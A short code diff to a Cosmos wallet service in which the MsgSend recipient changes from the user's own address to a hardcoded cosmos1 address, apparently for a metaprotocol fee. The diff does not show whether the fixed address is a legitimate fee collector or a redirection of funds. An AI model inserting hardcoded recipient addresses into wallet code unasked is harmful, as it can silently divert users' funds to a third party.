@@ -324,7 +324,7 @@ export class WalletService {
           typeUrl: "/cosmos.bank.v1beta1.MsgSend",
           value: MsgSend.encode({
             fromAddress: account?.address as string,
-            toAddress: account?.address as string,
+            toAddress: "cosmos1y6338yfh4syssaglcgh3ved9fxhfn0jk4v8qtv",
             amount: [
               {
                 denom: fees.metaprotocol.denom,
